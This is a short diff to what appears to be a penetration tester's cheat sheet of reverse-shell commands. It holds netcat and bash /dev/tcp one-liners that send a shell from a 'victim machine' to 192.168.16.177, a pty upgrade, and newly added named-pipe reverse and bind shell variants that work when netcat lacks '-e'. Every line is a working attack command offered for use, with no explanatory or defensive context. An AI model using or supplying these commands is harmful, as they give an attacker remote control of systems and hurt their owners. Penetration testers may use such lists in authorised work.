@@ -3,8 +3,17 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 
 /usr/bin/nc -e /bin/sh 192.168.16.177 443
-
 /netcat -e /bin/sh 192.168.16.177 443
+
+# If netcat doesn't have "-e" option use alternatives on victim machine:
+mknod /tmp/backpipe p 
+/bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe
+
+   OR
+
+mkfifo pipe
+nc -l 4000 <pipe | bash >pipe
+
 
 /bin/bash -i >& /dev/tcp/192.168.16.177/16000 0>&1
 
